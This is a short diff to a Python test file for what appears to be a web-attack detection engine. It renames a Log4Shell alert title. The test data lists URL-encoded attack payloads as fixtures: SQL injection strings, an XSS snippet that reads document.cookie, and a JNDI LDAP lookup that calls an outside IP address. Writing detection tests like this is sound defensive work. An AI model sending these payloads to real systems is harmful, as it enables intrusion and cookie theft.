@@ -57,7 +57,7 @@ def test_url_decode():
     ("/item?id=1+union+all+select+null,version()--", "SQL Injection In A Web Request"),
     ("/p?id=1%20AND%20SLEEP(5)", "SQL Injection In A Web Request"),
     ("/q?name=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E", "Cross-Site Scripting (XSS) Attempt"),
-    ("/x?u=%24%7Bjndi%3Aldap%3A%2F%2F45.9.20.1%2Fa%7D", "Log4Shell Exploitation Attempt (CVE-2021-44228)"),
+    ("/x?u=%24%7Bjndi%3Aldap%3A%2F%2F45.9.20.1%2Fa%7D", "Log4Shell JNDI Lookup In A Web Request (CVE-2021-44228)"),
 ])
 def test_encoded_payloads_fire(engines, path, title):
     event, titles = _titles(engines, path)
